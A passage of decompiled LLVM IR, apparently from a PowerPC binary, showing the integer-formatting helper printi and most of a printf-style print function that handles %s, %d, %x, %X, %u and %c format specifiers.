dec_label_pc_100007d8:                            ; preds = %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge, %dec_label_pc_100007cc.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp46, %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_100007cc.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000788, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100006b8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100007a8, { 1, 0 }
  uselistorder label %dec_label_pc_10000760, { 1, 0 }
  uselistorder label %dec_label_pc_1000072c, { 1, 0 }
  uselistorder label %dec_label_pc_10000718, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000700, { 1, 0 }
  uselistorder label %dec_label_pc_100006a8, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10000844 = icmp eq i32 %arg2, 0
  br i1 %v3_10000844, label %dec_label_pc_1000084c, label %dec_label_pc_10000880

dec_label_pc_1000084c:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10000870 = bitcast i32* %stack_var_-88 to i8*
  %v5_10000870 = call i32 @prints(i32 %arg1, i8* %v4_10000870, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_100009d8

dec_label_pc_10000880:                            ; preds = %entry
  %v3_10000884 = icmp eq i32 %arg4, 0
  br i1 %v3_10000884, label %dec_label_pc_100008b8, label %dec_label_pc_1000088c

dec_label_pc_1000088c:                            ; preds = %dec_label_pc_10000880
  %v3_10000890 = icmp eq i32 %arg3, 10
  br i1 %v3_10000890, label %dec_label_pc_10000898, label %dec_label_pc_100008b8

dec_label_pc_10000898:                            ; preds = %dec_label_pc_1000088c
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_100008b8, label %dec_label_pc_100008a4

dec_label_pc_100008a4:                            ; preds = %dec_label_pc_10000898
  %v1_100008b0 = sub i32 0, %arg2
  br label %dec_label_pc_100008b8

dec_label_pc_100008b8:                            ; preds = %dec_label_pc_1000088c, %dec_label_pc_10000898, %dec_label_pc_10000880, %dec_label_pc_100008a4
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10000880 ], [ %arg2, %dec_label_pc_10000898 ], [ %v1_100008b0, %dec_label_pc_100008a4 ], [ %arg2, %dec_label_pc_1000088c ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000880 ], [ 0, %dec_label_pc_10000898 ], [ 1, %dec_label_pc_100008a4 ], [ 0, %dec_label_pc_1000088c ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_100009445 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_100009445, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0.lr.ph

dec_label_pc_100008d0.lr.ph:                      ; preds = %dec_label_pc_100008b8
  %v2_10000900 = add i32 %arg7, -58
  br label %dec_label_pc_100008d0

dec_label_pc_100008d0:                            ; preds = %dec_label_pc_100008d0.lr.ph, %dec_label_pc_1000090c
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_100008d0.lr.ph ], [ %v2_10000938, %dec_label_pc_1000090c ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_100008d0.lr.ph ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v2_100008d8 = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_100008d8, 10
  br i1 %tmp29, label %dec_label_pc_1000090c, label %dec_label_pc_100008f8

dec_label_pc_100008f8:                            ; preds = %dec_label_pc_100008d0
  %v1_10000904 = add i32 %v2_10000900, %v2_100008d8
  br label %dec_label_pc_1000090c

dec_label_pc_1000090c:                            ; preds = %dec_label_pc_100008d0, %dec_label_pc_100008f8
  %stack_var_-32.0 = phi i32 [ %v2_100008d8, %dec_label_pc_100008d0 ], [ %v1_10000904, %dec_label_pc_100008f8 ]
  %v4_1000090c = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10000910 = add i32 %v4_1000090c, -1
  %v5_10000914 = inttoptr i32 %v1_10000910 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_1000092c = trunc i32 %fold to i8
  store i8 %v1_1000092c, i8* %v5_10000914, align 1
  %v2_10000938 = udiv i32 %stack_var_-44.17, %arg3
  %v3_10000944 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10000944, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0

dec_label_pc_1000094c:                            ; preds = %dec_label_pc_1000090c, %dec_label_pc_100008b8
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_100008b8 ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v3_10000950 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10000950, label %dec_label_pc_100009b4, label %dec_label_pc_10000958

dec_label_pc_10000958:                            ; preds = %dec_label_pc_1000094c
  %v3_1000095c = icmp eq i32 %arg5, 0
  br i1 %v3_1000095c, label %dec_label_pc_1000099c, label %dec_label_pc_10000964

dec_label_pc_10000964:                            ; preds = %dec_label_pc_10000958
  %v1_10000968 = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_1000096c = icmp eq i32 %v1_10000968, 0
  br i1 %v3_1000096c, label %dec_label_pc_1000099c, label %dec_label_pc_10000974

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000964
  %v2_1000097c = inttoptr i32 %arg1 to i32*
  %v3_1000097c = call i32 @printchar(i32* %v2_1000097c, i32 45)
  %v1_10000990 = add i32 %arg5, -1
  br label %dec_label_pc_100009b4

dec_label_pc_1000099c:                            ; preds = %dec_label_pc_10000964, %dec_label_pc_10000958
  %v4_1000099c = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_100009a0 = add i32 %v4_1000099c, -1
  %v5_100009a4 = inttoptr i32 %v1_100009a0 to i8*
  store i8 45, i8* %v5_100009a4, align 1
  br label %dec_label_pc_100009b4

dec_label_pc_100009b4:                            ; preds = %dec_label_pc_1000094c, %dec_label_pc_10000974, %dec_label_pc_1000099c
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_1000094c ], [ %v5_100009a4, %dec_label_pc_1000099c ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10000974 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_1000094c ], [ %arg5, %dec_label_pc_1000099c ], [ %v1_10000990, %dec_label_pc_10000974 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_1000094c ], [ 0, %dec_label_pc_1000099c ], [ 1, %dec_label_pc_10000974 ]
  %v5_100009c4 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_100009d0 = add i32 %v5_100009c4, %stack_var_-40.0
  br label %dec_label_pc_100009d8

dec_label_pc_100009d8:                            ; preds = %dec_label_pc_1000084c, %dec_label_pc_100009b4
  %storemerge = phi i32 [ %v2_100009d0, %dec_label_pc_100009b4 ], [ %v5_10000870, %dec_label_pc_1000084c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10000914, { 0, 2, 1 }
  uselistorder i32 %v2_100008d8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100009d8, { 1, 0 }
  uselistorder label %dec_label_pc_100009b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000090c, { 1, 0 }
  uselistorder label %dec_label_pc_100008d0, { 1, 0 }
  uselistorder label %dec_label_pc_100008b8, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_10000fc828 = load i8, i8* %stack_var_-68.427, align 1
  %v3_10000fd031 = icmp eq i8 %v2_10000fc828, 0
  br i1 %v3_10000fd031, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24.lr.ph

dec_label_pc_10000a24.lr.ph:                      ; preds = %entry
  %v1_10000b98 = add i32 %arg3, 4
  %v2_10000b98 = inttoptr i32 %v1_10000b98 to i32*
  %v1_10000b60 = add i32 %arg3, 8
  %v2_10000b60 = inttoptr i32 %v1_10000b60 to i32*
  %v4_10000f7c = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10000a24

dec_label_pc_10000a24:                            ; preds = %dec_label_pc_10000a24.lr.ph, %dec_label_pc_10000fb8
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_10000fb8 ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10000a24.lr.ph ], [ %v1_10000fbc, %dec_label_pc_10000fb8 ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v2_10000a28 = load i8, i8* %stack_var_-68.434, align 1
  %v3_10000a30 = icmp eq i8 %v2_10000a28, 37
  br i1 %v3_10000a30, label %dec_label_pc_10000a38, label %dec_label_pc_10000f94

dec_label_pc_10000a38:                            ; preds = %dec_label_pc_10000a24
  %v1_10000a3c = add i32 %stack_var_-68.4.in33, 1
  %v5_10000a40 = inttoptr i32 %v1_10000a3c to i8*
  %v2_10000a58 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a60 = icmp eq i8 %v2_10000a58, 0
  br i1 %v3_10000a60, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a68

dec_label_pc_10000a68:                            ; preds = %dec_label_pc_10000a38
  %v2_10000a6c = load i8, i8* %v5_10000a40, align 1
  %v3_10000a74 = icmp eq i8 %v2_10000a6c, 37
  br i1 %v3_10000a74, label %dec_label_pc_10000f94, label %dec_label_pc_10000a7c

dec_label_pc_10000a7c:                            ; preds = %dec_label_pc_10000a68
  %v2_10000a80 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a88 = icmp eq i8 %v2_10000a80, 45
  br i1 %v3_10000a88, label %dec_label_pc_10000a90, label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000a90:                            ; preds = %dec_label_pc_10000a7c
  %v1_10000a94 = add i32 %stack_var_-68.4.in33, 2
  %v5_10000a98 = inttoptr i32 %v1_10000a94 to i8*
  br label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000ac0.preheader:                  ; preds = %dec_label_pc_10000a90, %dec_label_pc_10000a7c
  %stack_var_-68.0.ph = phi i8* [ %v5_10000a40, %dec_label_pc_10000a7c ], [ %v5_10000a98, %dec_label_pc_10000a90 ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10000a7c ], [ 1, %dec_label_pc_10000a90 ]
  %v4_10000ac03 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_10000ac44 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_10000acc8 = icmp eq i8 %v2_10000ac44, 48
  br i1 %v3_10000acc8, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000aa8:                            ; preds = %dec_label_pc_10000ac0.preheader, %dec_label_pc_10000aa8
  %v4_10000ac010 = phi i32 [ %v1_10000aac, %dec_label_pc_10000aa8 ], [ %v4_10000ac03, %dec_label_pc_10000ac0.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_10000ab8, %dec_label_pc_10000aa8 ], [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ]
  %v1_10000aac = add i32 %v4_10000ac010, 1
  %v5_10000ab0 = inttoptr i32 %v1_10000aac to i8*
  %v1_10000ab8 = or i32 %stack_var_-52.09, 2
  %v2_10000ac4 = load i8, i8* %v5_10000ab0, align 1
  %v3_10000acc = icmp eq i8 %v2_10000ac4, 48
  br i1 %v3_10000acc, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000b0c.preheader:                  ; preds = %dec_label_pc_10000aa8, %dec_label_pc_10000ac0.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v1_10000ab8, %dec_label_pc_10000aa8 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v5_10000ab0, %dec_label_pc_10000aa8 ]
  %v4_10000b0c12 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_10000b1013 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_10000b1013, 48
  br i1 %tmp62, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000b20
  %v1_10000adc = mul i32 %stack_var_-48.018, 10
  %v2_10000ae8 = load i8, i8* %stack_var_-68.119, align 1
  %v3_10000ae8 = zext i8 %v2_10000ae8 to i32
  %v2_10000af4 = add i32 %v1_10000adc, -48
  %v1_10000af8 = add i32 %v2_10000af4, %v3_10000ae8
  %v1_10000b04 = add i32 %v4_10000b0c20, 1
  %v5_10000b08 = inttoptr i32 %v1_10000b04 to i8*
  %v2_10000b10 = load i8, i8* %v5_10000b08, align 1
  %tmp63 = icmp ult i8 %v2_10000b10, 48
  br i1 %tmp63, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000b0c.preheader, %dec_label_pc_10000ad8
  %v4_10000b0c20 = phi i32 [ %v1_10000b04, %dec_label_pc_10000ad8 ], [ %v4_10000b0c12, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ 0, %dec_label_pc_10000b0c.preheader ]
  %v2_10000b24 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10000b24, 58
  br i1 %tmp64, label %dec_label_pc_10000ad8, label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000b20, %dec_label_pc_10000b0c.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10000b0c.preheader ], [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ %stack_var_-48.018, %dec_label_pc_10000b20 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ], [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.119, %dec_label_pc_10000b20 ]
  %v2_10000b38 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000b40 = icmp eq i8 %v2_10000b38, 115
  br i1 %v3_10000b40, label %dec_label_pc_10000b48, label %dec_label_pc_10000c08

dec_label_pc_10000b48:                            ; preds = %dec_label_pc_10000b34
  %v2_10000b4c = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_10000b4c, 7
  br i1 %tmp65, label %dec_label_pc_10000b94, label %dec_label_pc_10000b5c

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b60 = load i32, i32* %v2_10000b60, align 4
  %v2_10000b68 = load i8, i8* %tmp, align 1
  %v3_10000b68 = zext i8 %v2_10000b68 to i32
  %v1_10000b74 = mul nuw nsw i32 %v3_10000b68, 4
  %v2_10000b78 = add i32 %v1_10000b74, %v3_10000b60
  %v1_10000b80 = add i8 %v2_10000b68, 1
  store i8 %v1_10000b80, i8* %tmp, align 1
  br label %dec_label_pc_10000bac

dec_label_pc_10000b94:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b98 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ba0 = add i32 %v3_10000b98, 4
  store i32 %v1_10000ba0, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000bac

dec_label_pc_10000bac:                            ; preds = %dec_label_pc_10000b5c, %dec_label_pc_10000b94
  %stack_var_-20.0 = phi i32 [ %v3_10000b98, %dec_label_pc_10000b94 ], [ %v2_10000b78, %dec_label_pc_10000b5c ]
  %v1_10000bb0 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10000bb0 = load i32, i32* %v1_10000bb0, align 4
  %v3_10000bbc = icmp eq i32 %v2_10000bb0, 0
  br i1 %v3_10000bbc, label %dec_label_pc_10000bd0, label %dec_label_pc_10000bc4

dec_label_pc_10000bc4:                            ; preds = %dec_label_pc_10000bac
  %v5_10000bc8 = inttoptr i32 %v2_10000bb0 to i8*
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bd0:                            ; preds = %dec_label_pc_10000bac
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bdc:                            ; preds = %dec_label_pc_10000bc4, %dec_label_pc_10000bd0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10010c4c.15, i32 0, i32 0), %dec_label_pc_10000bd0 ], [ %v5_10000bc8, %dec_label_pc_10000bc4 ]
  %v6_10000bf0 = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000bfc = add i32 %v6_10000bf0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000c08:                            ; preds = %dec_label_pc_10000b34
  %v2_10000c0c = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000c14 = icmp eq i8 %v2_10000c0c, 100
  br i1 %v3_10000c14, label %dec_label_pc_10000c1c, label %dec_label_pc_10000cbc

dec_label_pc_10000c1c:                            ; preds = %dec_label_pc_10000c08
  %v2_10000c20 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_10000c20, 7
  br i1 %tmp66, label %dec_label_pc_10000c68, label %dec_label_pc_10000c30

dec_label_pc_10000c30:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c34 = load i32, i32* %v2_10000b60, align 4
  %v2_10000c3c = load i8, i8* %tmp, align 1
  %v3_10000c3c = zext i8 %v2_10000c3c to i32
  %v1_10000c48 = mul nuw nsw i32 %v3_10000c3c, 4
  %v2_10000c4c = add i32 %v1_10000c48, %v3_10000c34
  %v1_10000c54 = add i8 %v2_10000c3c, 1
  store i8 %v1_10000c54, i8* %tmp, align 1
  br label %dec_label_pc_10000c80

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c6c = load i32, i32* %v2_10000b98, align 4
  %v1_10000c74 = add i32 %v3_10000c6c, 4
  store i32 %v1_10000c74, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000c80

dec_label_pc_10000c80:                            ; preds = %dec_label_pc_10000c30, %dec_label_pc_10000c68
  %stack_var_-28.0 = phi i32 [ %v3_10000c6c, %dec_label_pc_10000c68 ], [ %v2_10000c4c, %dec_label_pc_10000c30 ]
  %v1_10000c84 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_10000c84 = load i32, i32* %v1_10000c84, align 4
  %v7_10000ca4 = call i32 @printi(i32 %tmp41, i32 %v2_10000c84, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000cb0 = add i32 %v7_10000ca4, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000cbc:                            ; preds = %dec_label_pc_10000c08
  %v2_10000cc0 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000cc8 = icmp eq i8 %v2_10000cc0, 120
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000d70

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000cd4 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_10000cd4, 7
  br i1 %tmp67, label %dec_label_pc_10000d1c, label %dec_label_pc_10000ce4

dec_label_pc_10000ce4:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000ce8 = load i32, i32* %v2_10000b60, align 4
  %v2_10000cf0 = load i8, i8* %tmp, align 1
  %v3_10000cf0 = zext i8 %v2_10000cf0 to i32
  %v1_10000cfc = mul nuw nsw i32 %v3_10000cf0, 4
  %v2_10000d00 = add i32 %v1_10000cfc, %v3_10000ce8
  %v1_10000d08 = add i8 %v2_10000cf0, 1
  store i8 %v1_10000d08, i8* %tmp, align 1
  br label %dec_label_pc_10000d34

dec_label_pc_10000d1c:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000d20 = load i32, i32* %v2_10000b98, align 4
  %v1_10000d28 = add i32 %v3_10000d20, 4
  store i32 %v1_10000d28, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000d34

dec_label_pc_10000d34:                            ; preds = %dec_label_pc_10000ce4, %dec_label_pc_10000d1c
  %stack_var_-32.0 = phi i32 [ %v3_10000d20, %dec_label_pc_10000d1c ], [ %v2_10000d00, %dec_label_pc_10000ce4 ]
  %v1_10000d38 = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_10000d38 = load i32, i32* %v1_10000d38, align 4
  %v7_10000d58 = call i32 @printi(i32 %tmp41, i32 %v2_10000d38, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000d64 = add i32 %v7_10000d58, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000d70:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000d74 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000d7c = icmp eq i8 %v2_10000d74, 88
  br i1 %v3_10000d7c, label %dec_label_pc_10000d84, label %dec_label_pc_10000e24

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d70
  %v2_10000d88 = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_10000d88, 7
  br i1 %tmp68, label %dec_label_pc_10000dd0, label %dec_label_pc_10000d98

dec_label_pc_10000d98:                            ; preds = %dec_label_pc_10000d84
  %v3_10000d9c = load i32, i32* %v2_10000b60, align 4
  %v2_10000da4 = load i8, i8* %tmp, align 1
  %v3_10000da4 = zext i8 %v2_10000da4 to i32
  %v1_10000db0 = mul nuw nsw i32 %v3_10000da4, 4
  %v2_10000db4 = add i32 %v1_10000db0, %v3_10000d9c
  %v1_10000dbc = add i8 %v2_10000da4, 1
  store i8 %v1_10000dbc, i8* %tmp, align 1
  br label %dec_label_pc_10000de8

dec_label_pc_10000dd0:                            ; preds = %dec_label_pc_10000d84
  %v3_10000dd4 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ddc = add i32 %v3_10000dd4, 4
  store i32 %v1_10000ddc, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000de8

dec_label_pc_10000de8:                            ; preds = %dec_label_pc_10000d98, %dec_label_pc_10000dd0
  %stack_var_-36.0 = phi i32 [ %v3_10000dd4, %dec_label_pc_10000dd0 ], [ %v2_10000db4, %dec_label_pc_10000d98 ]
  %v1_10000dec = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_10000dec = load i32, i32* %v1_10000dec, align 4
  %v7_10000e0c = call i32 @printi(i32 %tmp41, i32 %v2_10000dec, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_10000e18 = add i32 %v7_10000e0c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000e24:                            ; preds = %dec_label_pc_10000d70
  %v2_10000e28 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000e30 = icmp eq i8 %v2_10000e28, 117
  br i1 %v3_10000e30, label %dec_label_pc_10000e38, label %dec_label_pc_10000ed8

dec_label_pc_10000e38:                            ; preds = %dec_label_pc_10000e24
  %v2_10000e3c = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_10000e3c, 7
  br i1 %tmp69, label %dec_label_pc_10000e84, label %dec_label_pc_10000e4c

dec_label_pc_10000e4c:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e50 = load i32, i32* %v2_10000b60, align 4
  %v2_10000e58 = load i8, i8* %tmp, align 1
  %v3_10000e58 = zext i8 %v2_10000e58 to i32
  %v1_10000e64 = mul nuw nsw i32 %v3_10000e58, 4
  %v2_10000e68 = add i32 %v1_10000e64, %v3_10000e50
  %v1_10000e70 = add i8 %v2_10000e58, 1
  store i8 %v1_10000e70, i8* %tmp, align 1
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e84:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e88 = load i32, i32* %v2_10000b98, align 4
  %v1_10000e90 = add i32 %v3_10000e88, 4
  store i32 %v1_10000e90, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e4c, %dec_label_pc_10000e84
  %stack_var_-40.0 = phi i32 [ %v3_10000e88, %dec_label_pc_10000e84 ], [ %v2_10000e68, %dec_label_pc_10000e4c ]
  %v1_10000ea0 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_10000ea0 = load i32, i32* %v1_10000ea0, align 4
  %v7_10000ec0 = call i32 @printi(i32 %tmp41, i32 %v2_10000ea0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000ecc = add i32 %v7_10000ec0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000ed8:                            ; preds = %dec_label_pc_10000e24
  %v2_10000edc = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000ee4 = icmp eq i8 %v2_10000edc, 99
  br i1 %v3_10000ee4, label %dec_label_pc_10000eec, label %dec_label_pc_10000fb8

dec_label_pc_10000eec:                            ; preds = %dec_label_pc_10000ed8
  %v2_10000ef0 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_10000ef0, 7
  br i1 %tmp70, label %dec_label_pc_10000f38, label %dec_label_pc_10000f00

dec_label_pc_10000f00:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f04 = load i32, i32* %v2_10000b60, align 4
  %v2_10000f0c = load i8, i8* %tmp, align 1
  %v3_10000f0c = zext i8 %v2_10000f0c to i32
  %v1_10000f18 = mul nuw nsw i32 %v3_10000f0c, 4
  %v2_10000f1c = add i32 %v1_10000f18, %v3_10000f04
  %v1_10000f24 = add i8 %v2_10000f0c, 1
  store i8 %v1_10000f24, i8* %tmp, align 1
  br label %dec_label_pc_10000f50

dec_label_pc_10000f38:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f3c = load i32, i32* %v2_10000b98, align 4
  %v1_10000f44 = add i32 %v3_10000f3c, 4
  store i32 %v1_10000f44, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000f50

dec_label_pc_10000f50:                            ; preds = %dec_label_pc_10000f00, %dec_label_pc_10000f38
  %stack_var_-44.0 = phi i32 [ %v3_10000f3c, %dec_label_pc_10000f38 ], [ %v2_10000f1c, %dec_label_pc_10000f00 ]
  %v1_10000f54 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_10000f54 = load i32, i32* %v1_10000f54, align 4
  %v1_10000f58 = urem i32 %v2_10000f54, 256
  store i32 %v1_10000f58, i32* %stack_var_-88, align 4
  %v5_10000f7c = call i32 @prints(i32 %tmp41, i8* %v4_10000f7c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000f88 = add i32 %v5_10000f7c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000f94:                            ; preds = %dec_label_pc_10000a24, %dec_label_pc_10000a68
  %stack_var_-68.2 = phi i8* [ %v5_10000a40, %dec_label_pc_10000a68 ], [ %stack_var_-68.434, %dec_label_pc_10000a24 ]
  %v2_10000f98 = load i8, i8* %stack_var_-68.2, align 1
  %v3_10000f98 = zext i8 %v2_10000f98 to i32
  %v3_10000fa8 = call i32 @printchar(i32* %arg1, i32 %v3_10000f98)
  %v1_10000fb0 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_10000fb8

